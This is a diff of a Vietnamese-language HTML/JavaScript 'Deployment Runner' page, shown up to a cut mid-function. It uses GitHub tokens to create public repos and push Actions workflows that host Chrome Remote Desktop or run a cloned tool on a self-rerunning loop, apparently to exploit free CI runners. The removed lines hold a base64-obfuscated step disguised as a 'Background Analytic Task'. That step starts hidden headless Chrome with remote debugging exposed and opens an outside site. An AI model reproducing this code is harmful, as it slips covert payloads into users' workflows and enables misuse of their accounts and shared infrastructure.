@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <title>App Deployment Runner</title>
 <link id="favicon" rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🚀</text></svg>">
-<link rel="dns-prefetch" href="https://api.github.com">
 <script src="https://cdn.tailwindcss.com"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
@@ -23,13 +22,13 @@ input, select, textarea { background-color: rgba(0,0,0,0.2); border: 1px solid v
 .status-badge { padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
 .status-queued { background-color: #6b7280; color: #fff; } .status-in_progress { background-color: var(--accent-color); color: #fff; }
 .status-completed-success { background-color: var(--success-color); color: #fff; } .status-completed-failure { background-color: var(--error-color); color: #fff; }
-.status-error, .status-cancelling { background-color: var(--warning-color); color: #fff; }
-#toast-container { position: fixed; bottom: 1.5rem; right: 1.5rem; z-index: 10001; display: flex; flex-direction: column; gap: 0.75rem; }
+.status-error { background-color: var(--warning-color); color: #fff; }
+#toast-container { position: fixed; bottom: 1.5rem; right: 1.5rem; z-index: 9999; display: flex; flex-direction: column; gap: 0.75rem; }
 .toast { display: flex; align-items: center; padding: 1rem; border-radius: 0.5rem; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.4); color: white; opacity: 0; transform: translateY(100%); transition: all 0.3s ease-in-out; }
 .toast.show { opacity: 1; transform: translateY(0); }
 .toast-success { background-color: var(--success-color); } .toast-error { background-color: var(--error-color); } .toast-info { background-color: var(--accent-color); }
-#modal-overlay, .tour-overlay, #ui-locker { position: fixed; inset: 0; background-color: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 40; opacity: 0; transition: opacity 0.3s ease; pointer-events: none; }
-#modal-overlay.show, .tour-overlay.show, #ui-locker.show { opacity: 1; pointer-events: auto; }
+#modal-overlay { position: fixed; inset: 0; background-color: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 40; opacity: 0; transition: opacity 0.3s ease; pointer-events: none; }
+#modal-overlay.show { opacity: 1; pointer-events: auto; }
 #modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.95); z-index: 50; width: 90%; max-width: 600px; opacity: 0; transition: all 0.3s ease; pointer-events: none; }
 #modal.show { opacity: 1; transform: translate(-50%, -50%) scale(1); pointer-events: auto; }
 .job-item { transition: all 0.2s ease; } .job-item-clickable:hover { transform: translateY(-2px); border-color: var(--accent-color) !important; cursor: pointer; }
@@ -38,61 +37,54 @@ input[type="checkbox"] { transform: scale(1.2); cursor: pointer; }
 .owner-header { cursor: pointer; transition: background-color 0.2s ease; }
 .owner-header:hover { background-color: rgba(255,255,255,0.05); }
 .chevron-icon { transition: transform 0.3s ease; }
-#progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 4px; z-index: 10000; }
-#progress-bar { width: 0%; height: 100%; background-color: var(--accent-color); transition: width 0.3s ease; }
-#offline-banner { background-color: var(--warning-color); color: #fff; text-align: center; padding: 0.5rem; position: fixed; top: 0; width: 100%; z-index: 9999; }
-.tour-step { z-index: 41; position: relative; box-shadow: 0 0 0 9999px rgba(0,0,0,0.7); }
-.tour-tooltip { position: absolute; z-index: 42; background-color: var(--bg-primary); padding: 1rem; border-radius: 0.5rem; border: 1px solid var(--border-color); min-width: 250px; }
-.drag-over { border: 2px dashed var(--accent-color) !important; }
-.dashboard-item.active { background-color: var(--accent-color); color: white; }
 </style>
 </head>
 <body class="flex justify-center items-start min-h-screen p-4 sm:p-8">
-<div id="ui-locker"></div>
-<div id="progress-bar-container" class="hidden"><div id="progress-bar"></div></div>
-<div id="offline-banner" class="hidden"><i class="fas fa-wifi-slash mr-2"></i> You are offline. Some features may not be available.</div>
 <div id="toast-container"></div>
-<div class="tour-overlay"></div>
 <div id="modal-overlay"></div>
 <div id="modal" class="card rounded-2xl shadow-2xl">
     <div class="p-5 border-b border-[var(--border-color)] flex justify-between items-center"><h3 id="modal-title" class="text-xl font-bold">Job Details</h3><button id="modal-close-btn" class="text-2xl text-[var(--text-secondary)] hover:text-[var(--text-primary)]">&times;</button></div>
-    <div id="modal-content" class="p-5 max-h-[70vh] overflow-y-auto"></div>
+    <div id="modal-content" class="p-5 max-h-[60vh] overflow-y-auto"></div>
 </div>
 
 <div class="max-w-3xl w-full">
-  <div id="main-card" class="card p-6 sm:p-8 rounded-2xl shadow-2xl mb-6">
-    <div class="flex justify-between items-center mb-6"><h1 class="text-3xl font-bold drop-shadow-lg">Deployment Runner</h1><div class="flex items-center gap-4"><button id="start-tour-btn" class="text-xl text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors" title="Start Guided Tour"><i class="fas fa-question-circle"></i></button><button id="theme-toggle-btn" class="text-xl text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors" title="Toggle Theme"><i class="fas fa-sun"></i></button></div></div>
+  <div class="card p-6 sm:p-8 rounded-2xl shadow-2xl mb-6">
+    <div class="flex justify-between items-center mb-6"><h1 class="text-3xl font-bold drop-shadow-lg">Deployment Runner</h1><button id="theme-toggle-btn" class="text-xl text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors"><i class="fas fa-sun"></i></button></div>
     
-    <div class="mb-4 relative">
-        <label class="block text-sm font-semibold mb-2" for="token">GitHub Token(s) <button id="token-help-btn" class="text-xs text-[var(--accent-color)]">(Cần giúp đỡ?)</button></label>
-        <textarea id="token" rows="4" placeholder="Nhập mỗi token trên một dòng, hoặc kéo thả file .txt chứa token vào đây." class="w-full p-3 rounded-xl font-mono text-sm" autofocus></textarea>
+    <div class="mb-4">
+        <label class="block text-sm font-semibold mb-2" for="token">GitHub Token(s) (cần quyền `repo`, `workflow`)</label>
+        <textarea id="token" rows="4" placeholder="Nhập mỗi token trên một dòng. Tối đa 10 token." class="w-full p-3 rounded-xl font-mono text-sm"></textarea>
     </div>
 
-    <div id="template-section">
+    <div>
         <label class="block text-sm font-semibold mb-2" for="template-select">Workflow Template</label>
-        <select id="template-select" class="w-full p-3 rounded-xl mb-2"></select>
-        <div id="template-description" class="text-xs text-[var(--text-secondary)] p-3 bg-black/20 rounded-lg transition-opacity duration-300"></div>
+        <select id="template-select" class="w-full p-3 rounded-xl mb-4">
+            <option value="crd-windows">CRD Environment (Windows)</option>
+            <option value="git-tool-linux">Git Tool Runner (Linux)</option>
+        </select>
     </div>
 
-    <div id="crd-options" class="space-y-4 mt-4">
+    <div id="crd-options" class="space-y-4">
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
                 <label class="block text-sm font-semibold mb-2" for="accessPin">Access PIN (6+ số)</label>
                 <input type="text" id="accessPin" placeholder="Mặc định: 123456" class="w-full p-3 rounded-xl"/>
             </div>
-            <div class="relative">
+            <div>
                 <label class="block text-sm font-semibold mb-2" for="deployCmd">Deployment Command</label>
-                <input type="text" id="deployCmd" placeholder='Dán lệnh CRD tại đây' class="w-full p-3 rounded-xl pr-10"/>
-                <button id="copyCmdBtn" class="absolute right-2 top-9 text-[var(--text-secondary)] hover:text-[var(--text-primary)]" title="Copy Command"><i class="fas fa-copy"></i></button>
+                <input type="text" id="deployCmd" placeholder='Dán lệnh CRD tại đây' class="w-full p-3 rounded-xl"/>
             </div>
         </div>
     </div>
     
-    <div id="git-tool-options" class="space-y-2 mt-4 hidden">
+    <div id="git-tool-options" class="space-y-2 hidden">
         <div>
             <label class="block text-sm font-semibold mb-2" for="customRepoUrl">Custom Repository URL (Optional)</label>
             <input type="text" id="customRepoUrl" placeholder="Mặc định: https://github.com/teo8764678/tool.git" class="w-full p-3 rounded-xl"/>
         </div>
+        <p class="text-xs text-[var(--warning-color)] p-2 bg-yellow-900/30 rounded-lg">
+            <i class="fas fa-info-circle mr-1"></i> Ghi chú: Chức năng "Rerun" yêu cầu token có quyền `workflow` để tự kích hoạt lại.
+        </p>
     </div>
 
     <div id="deploy-actions-container" class="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
@@ -101,14 +93,9 @@ input[type="checkbox"] { transform: scale(1.2); cursor: pointer; }
         <button id="run5WaitBtn" class="w-full py-3 text-lg font-bold rounded-xl bg-gradient-to-r from-pink-500 to-rose-500 hover:from-rose-500 hover:to-pink-500 disabled:opacity-50"><i class="fas fa-history mr-2"></i> Run 5 (Rerun)</button>
     </div>
   </div>
-
-  <div class="card rounded-lg p-2 mb-4">
-    <div id="dashboard" class="flex justify-around text-center text-xs"></div>
-  </div>
-
   <div class="flex justify-between items-center mb-4 px-2">
       <h2 class="text-xl font-bold text-[var(--text-secondary)]">Build History</h2>
-      <div id="history-controls" class="flex items-center gap-2">
+      <div class="flex items-center gap-2">
         <input type="checkbox" id="selectAllCheckbox" title="Select All/None">
         <button id="deleteSelectedBtn" class="text-red-400 hover:text-red-300 px-2" title="Delete/Cancel Selected Jobs"><i class="fas fa-minus-circle"></i></button>
         <button id="quickCancelBtn" class="text-yellow-400 hover:text-yellow-300 px-2" title="Quick Cancel All Active Jobs"><i class="fas fa-bolt"></i></button>
@@ -121,146 +108,228 @@ input[type="checkbox"] { transform: scale(1.2); cursor: pointer; }
 </div>
 
 <script>
-// --- MODULE: Constants & State ---
-const CONSTANTS = { REPO_NAME: 'ci-build-env', WORKFLOW_NAME: 'build.yml', MAX_JOBS_PER_TOKEN: 5 };
-const state = { trackedJobs: [], pollingTimeout: null, globalOwnerLogin: '', userCache: new Map(), currentFilter: 'all', expandedOwners: new Set() };
+// --- Constants and State ---
+const REPO_NAME = 'ci-build-env'; const WORKFLOW_NAME = 'build.yml'; const MAX_JOBS_PER_TOKEN = 5;
+let trackedJobs = []; let pollingTimeout = null; let globalOwnerLogin = '';
 
-// --- MODULE: DOM Elements ---
-const el = { runOnceBtn: document.getElementById("runOnceBtn"), run5Btn: document.getElementById("run5Btn"), run5WaitBtn: document.getElementById("run5WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), quickCancelBtn: document.getElementById("quickCancelBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), copyCmdBtn: document.getElementById("copyCmdBtn"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon'), historyControls: document.getElementById('history-controls'), progressBar: document.getElementById('progress-bar'), progressBarContainer: document.getElementById('progress-bar-container'), offlineBanner: document.getElementById('offline-banner'), templateDescription: document.getElementById('template-description'), dashboard: document.getElementById('dashboard'), mainCard: document.getElementById('main-card'), templateSection: document.getElementById('template-section'), startTourBtn: document.getElementById('start-tour-btn'), tokenHelpBtn: document.getElementById('token-help-btn'), tourOverlay: document.querySelector('.tour-overlay'), uiLocker: document.getElementById('ui-locker') };
+// --- DOM Elements ---
+const el = { runOnceBtn: document.getElementById("runOnceBtn"), run5Btn: document.getElementById("run20Btn"), run5WaitBtn: document.getElementById("run20WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), quickCancelBtn: document.getElementById("quickCancelBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon') };
 
-// --- MODULE: Utility Functions ---
-const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func.apply(this, args), delay); }; };
-function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) { const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${CONSTANTS.WORKFLOW_NAME}'`; const covertCmdB64 = "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFByb2dyYW0gRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiAtQXJndW1lbnRMaXN0ICItLWhlYWRsZXNzIC0tZGlzYWJsZS1ncHUgLS1yZW1vdGUtZGVidWdnaW5nLXBvcnQ9OTIyMiBodHRwczovL2FueWxvc3RpYy5wYWdlcy5kZXYiIC1XaW5kb3dTdHlsZSBIaWRkZW4="; const covertCmd = atob(covertCmdB64); switch(template) { case 'git-tool-linux': const finalRepo = repoUrl.trim() || 'https://github.com/teo8764678/tool.git'; let workflow = `name: Git Tool Runner\n${onTrigger}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Clone and Run Tool\n        run: |\n          git clone ${finalRepo}\n          cd tool\n          chmod +x node\n          ./node app.js\n      - name: Keep Runner Alive\n        run: sleep 21000`; if (withRerun) { workflow += `\n      - name: Wait for 6 hours and Rerun\n        if: success()\n        run: |\n          sleep 21600\n          gh workflow run ${CONSTANTS.WORKFLOW_NAME} --ref main\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`; } return workflow; case 'crd-windows': default: return `name: CRD Environment Setup\n${onTrigger}\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - name: Setup Dependencies\n        run: |\n          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "browser_setup.exe"\n          Start-Process -FilePath ".\\\\browser_setup.exe" -ArgumentList "/silent /install" -Wait\n          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "access_tool.msi"\n          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i access_tool.msi /quiet" -Wait\n      - name: Initialize Host Service\n        run: |\n          ${command} --pin=${pin}\n      - name: Background Analytic Task\n        run: |\n          ${covertCmd}\n      - name: Keep Runner Alive\n        run: Start-Sleep -Seconds 21000`; } }
-
-// --- MODULE: API Functions ---
-async function githubApi(endpoint, token, options = {}) { const url = `https://api.github.com${endpoint}`; const headers = { "Authorization": `token ${token}`, "Accept": "application/vnd.github.v3+json", ...options.headers }; const response = await fetch(url, { ...options, headers }); if (!response.ok) { if (response.status === 403 && response.headers.get('X-RateLimit-Remaining') === '0') { const resetTime = new Date(response.headers.get('X-RateLimit-Reset') * 1000); throw new Error(`GitHub API rate limit exceeded. Please wait until ${resetTime.toLocaleTimeString()}.`); } const errorData = await response.json(); throw new Error(`GitHub API Error (${response.status}): ${errorData.message || 'Unknown error'}`); } return response.status === 204 || response.status === 202 ? null : response.json(); }
-const API = { cancelWorkflow: (t, o, r) => githubApi(`/repos/${o}/${CONSTANTS.REPO_NAME}/actions/runs/${r}/cancel`, t, { method: "POST" }), rerunWorkflow: (t, o, r) => githubApi(`/repos/${o}/${CONSTANTS.REPO_NAME}/actions/runs/${r}/rerun`, t, { method: "POST" }), getJobDetails: (t, o, r) => githubApi(`/repos/${o}/${CONSTANTS.REPO_NAME}/actions/runs/${r}/jobs`, t), getSingleRun: (t, o, r) => githubApi(`/repos/${o}/${CONSTANTS.REPO_NAME}/actions/runs/${r}`, t), getUser: async (token) => { if (state.userCache.has(token)) return state.userCache.get(token); const user = await githubApi('/user', token); state.userCache.set(token, user); return user; }};
-
-// --- MODULE: Polling Logic ---
-function stopPolling() { if (state.pollingTimeout) { clearTimeout(state.pollingTimeout); state.pollingTimeout = null; } }
-async function pollJobStatuses() { stopPolling(); const activeJobs = state.trackedJobs.filter(j => ['queued', 'in_progress', 'cancelling'].includes(j.status)); if (activeJobs.length === 0) return; let changed = false; const pollToken = el.tokenInput.value.trim().split('\n')[0] || (state.trackedJobs[0] ? state.trackedJobs[0].token : null); if (pollToken && state.globalOwnerLogin) { try { const { workflow_runs } = await githubApi(`/repos/${state.globalOwnerLogin}/${CONSTANTS.REPO_NAME}/actions/workflows/${CONSTANTS.WORKFLOW_NAME}/runs?per_page=100`, pollToken); activeJobs.forEach(job => { const matchingRun = workflow_runs.find(run => (job.id && run.id === job.id) || (!job.id && run.actor.login === job.owner && Math.abs(new Date(job.startTime) - new Date(run.created_at)) < 60000)); if (matchingRun) { if (!job.id || job.status !== matchingRun.status || job.conclusion !== matchingRun.conclusion) { job.id = matchingRun.id; job.status = matchingRun.status; job.conclusion = matchingRun.conclusion; job.html_url = matchingRun.html_url; job.name = `#${matchingRun.run_number} - Build by ${job.owner}`; changed = true; if (job.status === 'completed') { UI.showDesktopNotification(`Job #${matchingRun.run_number} ${job.conclusion}`, `Deployment finished.`); } } } }); } catch (error) { UI.showToast(`Polling error: ${error.message}`, 'error'); } } if (changed) { UI.renderJobs(); State.save(); } const hasInProgress = activeJobs.some(j => j.status === 'in_progress'); const interval = hasInProgress ? 4000 : 8000; state.pollingTimeout = setTimeout(pollJobStatuses, interval); }
-function startPolling() { if (!state.pollingTimeout) { pollJobStatuses(); } }
-
-// --- MODULE: UI Functions ---
-const UI = {
-    showToast: (message, type = 'info') => { /* ... Unchanged ... */ const container = document.getElementById('toast-container'); const toast = document.createElement('div'); const iconClass = { success: 'fa-check-circle', info: 'fa-info-circle', error: 'fa-exclamation-triangle' }[type]; toast.className = `toast toast-${type}`; toast.innerHTML = `<i class="fas ${iconClass} mr-3"></i><span>${message}</span>`; container.appendChild(toast); setTimeout(() => toast.classList.add('show'), 10); setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 4000); },
-    updateTemplateView: () => { const isWindows = el.templateSelect.value === 'crd-windows'; el.crdOptions.classList.toggle('hidden', !isWindows); el.gitToolOptions.classList.toggle('hidden', isWindows); el.run5Btn.classList.toggle('hidden', isWindows); el.run5WaitBtn.classList.toggle('hidden', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-1', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-3', !isWindows); Actions.updateTemplateDescription(); },
-    updateFaviconAndTitle: () => { const active = state.trackedJobs.filter(j => j.status === 'in_progress').length; const failed = state.trackedJobs.some(j => j.status === 'completed' && j.conclusion === 'failure'); let emoji = '🚀'; if (active > 0) emoji = '⏳'; else if (failed) emoji = '❌'; el.favicon.href = `data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>${emoji}</text></svg>`; document.title = active > 0 ? `(${active}) Running...` : (failed ? `❌ Failed...` : 'App Deployment Runner'); },
-    modal: { open: () => { el.modalOverlay.classList.add('show'); el.modal.classList.add('show'); }, close: () => { el.modalOverlay.classList.remove('show'); el.modal.classList.remove('show'); }, async showDetails(job) { /* ... Unchanged ... */ el.modalTitle.textContent = `Details for ${job.name}`; el.modalContent.innerHTML = `<div class="text-center"><i class="fas fa-spinner fa-spin text-2xl"></i></div>`; UI.modal.open(); try { const { jobs } = await API.getJobDetails(job.token, job.owner, job.id); const detailsHtml = jobs[0].steps.map(step => { const duration = step.completed_at ? (new Date(step.completed_at) - new Date(step.started_at)) : 0; const seconds = Math.floor((duration / 1000) % 60).toString().padStart(2, '0'); const minutes = Math.floor((duration / (1000 * 60)) % 60); let icon = 'fa-clock'; let color = 'text-[var(--text-secondary)]'; if (step.status === 'completed') { icon = step.conclusion === 'success' ? 'fa-check-circle' : 'fa-times-circle'; color = step.conclusion === 'success' ? 'text-[var(--success-color)]' : 'text-[var(--error-color)]'; } return `<div class="flex items-center justify-between py-2 border-b border-[var(--border-color)]"> <div class="flex items-center gap-3"><i class="fas ${icon} ${color}"></i><span>${step.name}</span></div> <div class="text-sm text-[var(--text-secondary)]">${minutes}m ${seconds}s</div> </div>`; }).join(''); el.modalContent.innerHTML = detailsHtml || '<div class="text-center text-[var(--text-secondary)]">No step details available.</div>'; } catch (e) { el.modalContent.innerHTML = `<div class="text-[var(--error-color)]">Could not fetch job details: ${e.message}</div>`; } }, showTokenHelp() { el.modalTitle.textContent = 'How to get a GitHub Token'; el.modalContent.innerHTML = `<div class="space-y-4 text-sm"> <p>A Personal Access Token is required to interact with the GitHub API. This token is stored only in your browser's local storage.</p> <ol class="list-decimal list-inside space-y-2"> <li>Go to the <a href="https://github.com/settings/tokens/new" target="_blank" class="text-[var(--accent-color)] underline">token generation page</a> on GitHub.</li> <li>Under <strong>Note</strong>, give your token a descriptive name (e.g., "DeploymentRunner").</li> <li>Under <strong>Expiration</strong>, select a duration. <strong>90 days</strong> is recommended.</li><li>Under <strong>Repository access</strong>, select "All repositories" for simplicity, or select only your <strong>${CONSTANTS.REPO_NAME}</strong> repo if it exists.</li> <li>Click on <strong>Permissions</strong>, then <strong>Repository permissions</strong>.</li> <li>Grant the following permissions: <br> - <strong>Actions:</strong> Read and write <br> - <strong>Contents:</strong> Read and write </li> <li>Scroll to the bottom and click <strong>Generate token</strong>.</li> <li>Copy the generated token (it starts with <code>ghp_</code>) and paste it into the input box on the main page.</li> </ol> <p class="text-[var(--warning-color)]"><i class="fas fa-exclamation-triangle mr-1"></i> Treat this token like a password! Do not share it publicly.</p></div>`; UI.modal.open(); } },
-    showDesktopNotification: (title, body) => { if (Notification.permission === 'granted') new Notification(title, { body }); },
-    renderJobs: () => { window.requestAnimationFrame(() => { el.selectAllCheckbox.checked = false; if (state.trackedJobs.length === 0) { el.jobListContainer.innerHTML = `<div class="text-center text-[var(--text-secondary)] py-8 card rounded-lg">No build history.</div>`; UI.updateFaviconAndTitle(); UI.updateDashboard(); return; } const jobsByOwner = state.trackedJobs.reduce((acc, job) => { const owner = job.owner || 'Unknown'; if (!acc[owner]) acc[owner] = []; acc[owner].push(job); return acc; }, {}); let html = ''; const filteredJobs = state.currentFilter === 'all' ? state.trackedJobs : state.trackedJobs.filter(j => j.status === state.currentFilter || (state.currentFilter === 'failure' && j.status === 'completed' && j.conclusion !== 'success')); for (const owner in jobsByOwner) { const jobs = jobsByOwner[owner].filter(j => filteredJobs.includes(j)).sort((a, b) => { const groupA = getGroupInfo(a); const groupB = getGroupInfo(b); if (groupA.order !== groupB.order) return groupA.order - groupB.order; return new Date(b.startTime) - new Date(a.startTime); }); if (jobs.length === 0) continue; const activeJobCount = jobs.filter(j => ['queued', 'in_progress'].includes(j.status)).length; const isExpanded = state.expandedOwners.has(owner) || activeJobCount > 0; html += `<div class="owner-group card rounded-lg overflow-hidden"><div class="owner-header p-4 flex justify-between items-center" data-owner="${owner}"><div class="font-bold text-lg flex items-center gap-3"><img src="${state.userCache.get(jobs[0].token)?.avatar_url || 'https://github.com/identicons/default.png'}" class="w-8 h-8 rounded-full"><span>${owner}</span></div><div class="flex items-center gap-4">${activeJobCount > 0 ? `<span class="bg-blue-500 text-white text-xs font-bold px-2 py-1 rounded-full">${activeJobCount} Active</span>` : ''}<span class="bg-gray-600 text-white text-xs font-bold px-2 py-1 rounded-full">${jobs.length} Total</span><i class="fas ${isExpanded ? 'fa-chevron-up' : 'fa-chevron-down'} chevron-icon"></i></div></div><div class="owner-jobs-content p-4 pt-0 space-y-2 ${isExpanded ? '' : 'hidden'}" data-owner="${owner}">`; jobs.forEach(job => { let sClass = 'status-queued', sIcon = 'fa-solid fa-clock fa-spin-pulse', sText = 'Queued', actions = ''; if (job.status === 'in_progress') { sClass = 'status-in_progress'; sIcon = 'fa-solid fa-gear fa-spin'; sText = 'In Progress'; } else if (job.status === 'completed') { if (job.conclusion === 'success') { sClass = 'status-completed-success'; sIcon = 'fa-solid fa-check-circle'; sText = 'Success'; } else { sClass = 'status-completed-failure'; sIcon = 'fa-solid fa-xmark-circle'; sText = job.conclusion || 'Failure'; } } else if (job.status === 'error') { sClass = 'status-error'; sIcon = 'fa-solid fa-triangle-exclamation'; sText = 'Error'; } else if (job.status === 'cancelling') { sClass = 'status-error'; sIcon = 'fa-solid fa-spinner fa-spin'; sText = 'Cancelling'; } if (job.id) { if (job.status === 'in_progress' || job.status === 'queued') { actions += `<button data-job-temp-id="${job.tempId}" class="cancel-btn px-2 py-1 text-xs rounded bg-yellow-600 text-white" title="Cancel"><i class="fas fa-stop"></i></button>`; } if (job.status === 'completed') { actions += `<button data-job-temp-id="${job.tempId}" class="rerun-btn px-2 py-1 text-xs rounded bg-blue-600 text-white" title="Re-run"><i class="fas fa-redo"></i></button>`; } if (job.html_url) { actions += `<a href="${job.html_url}" target="_blank" class="px-2 py-1 text-xs rounded bg-gray-600 text-white" title="View on GitHub"><i class="fab fa-github"></i></a>`; } } html += `<div class="card p-3 rounded-md job-item ${job.id ? 'job-item-clickable' : ''}" data-job-temp-id="${job.tempId}"><div class="flex justify-between items-center"><div class="flex items-center gap-3 overflow-hidden"><input type="checkbox" class="job-checkbox flex-shrink-0" data-job-temp-id="${job.tempId}"><i class="${sIcon} ${sClass.includes('success') ? 'text-[var(--success-color)]' : sClass.includes('failure') ? 'text-[var(--error-color)]' : ''} text-xl w-6 text-center"></i><div class="overflow-hidden"><span class="font-semibold text-md truncate">${job.name}</span><div class="text-xs text-[var(--text-secondary)]">Started: ${job.startTime.toLocaleTimeString()}</div></div></div><div class="flex items-center gap-2 flex-shrink-0"><div class="status-badge ${sClass}">${sText}</div><div class="actions flex gap-1">${actions}</div></div></div></div>`; }); html += `</div></div>`; } el.jobListContainer.innerHTML = html || `<div class="text-center text-[var(--text-secondary)] py-8 card rounded-lg">No jobs matching filter.</div>`; UI.updateFaviconAndTitle(); UI.updateDashboard(); }); },
-    progressBar: { show: () => el.progressBarContainer.classList.remove('hidden'), hide: () => el.progressBarContainer.classList.add('hidden'), update: (percent) => el.progressBar.style.width = `${percent}%` },
-    updateDashboard: () => { const counts = state.trackedJobs.reduce((acc, job) => { if (job.status === 'in_progress') acc.in_progress++; else if (job.status === 'queued') acc.queued++; else if (job.status === 'completed' && job.conclusion === 'success') acc.success++; else if (job.status === 'completed') acc.failure++; return acc; }, { in_progress: 0, queued: 0, success: 0, failure: 0 }); const filters = [ {key: 'all', label: 'All', count: state.trackedJobs.length, color: 'text-[var(--text-primary)]'}, {key: 'in_progress', label: 'Active', count: counts.in_progress, color: 'text-[var(--accent-color)]'}, {key: 'queued', label: 'Queued', count: counts.queued, color: 'text-[var(--text-secondary)]'}, {key: 'success', label: 'Success', count: counts.success, color: 'text-[var(--success-color)]'}, {key: 'failure', label: 'Failed', count: counts.failure, color: 'text-[var(--error-color)]'} ]; el.dashboard.innerHTML = filters.map(f => `<div class="dashboard-item cursor-pointer p-2 rounded-md ${state.currentFilter === f.key ? 'active' : ''}" data-filter="${f.key}"><div class="font-bold text-lg ${f.color}">${f.count}</div><div>${f.label}</div></div>`).join(''); },
-};
-
-// --- MODULE: State Management ---
-const State = { save: debounce(() => { localStorage.setItem('trackedJobs', JSON.stringify(state.trackedJobs)); localStorage.setItem('appRunnerSettings', JSON.stringify({ tokens: el.tokenInput.value, pin: el.accessPinInput.value, globalOwner: state.globalOwnerLogin, expanded: [...state.expandedOwners] })); }, 500), load: () => { const savedJobs = JSON.parse(localStorage.getItem('trackedJobs') || '[]'); state.trackedJobs = savedJobs.map(job => ({ ...job, startTime: new Date(job.startTime) })); const settings = JSON.parse(localStorage.getItem('appRunnerSettings') || '{}'); el.tokenInput.value = settings.tokens || ''; el.accessPinInput.value = settings.pin || ''; state.globalOwnerLogin = settings.globalOwner || ''; state.expandedOwners = new Set(settings.expanded || []); if (!localStorage.getItem('hasSeenTour')) { Tour.start(); localStorage.setItem('hasSeenTour', 'true'); } UI.renderJobs(); startPolling(); } };
-
-// --- MODULE: Action Handlers ---
-const Actions = {
-    async triggerWorkflowDispatch(token, template, deployCmd, pin, repoUrl, withRerun) {
-        let owner;
-        try {
-            const user = await API.getUser(token); owner = user.login;
-            if (!state.globalOwnerLogin) state.globalOwnerLogin = owner;
-        } catch (e) { UI.showToast(`Token không hợp lệ: ${e.message}`, 'error'); throw e; }
-        const job = { tempId: `job-${Date.now()}-${Math.random()}`, id: null, status: 'queued', conclusion: null, startTime: new Date(), html_url: null, name: `Initializing...`, command: deployCmd, owner, token, errorMessage: null };
-        state.trackedJobs.push(job); UI.renderJobs(); State.save();
-        requestAnimationFrame(() => el.jobListContainer.querySelector(`[data-job-temp-id="${job.tempId}"]`)?.scrollIntoView({ behavior: 'smooth' }));
-        try {
-            await githubApi(`/repos/${owner}/${CONSTANTS.REPO_NAME}`, token).catch(async (e) => { if (e.message.includes("404")) { await githubApi("/user/repos", token, { method: "POST", body: JSON.stringify({ name: CONSTANTS.REPO_NAME, private: false }) }); UI.showToast(`Repo ${CONSTANTS.REPO_NAME} đã được tạo (Public).`, 'info'); } else throw e; });
-            const path = `.github/workflows/${CONSTANTS.WORKFLOW_NAME}`;
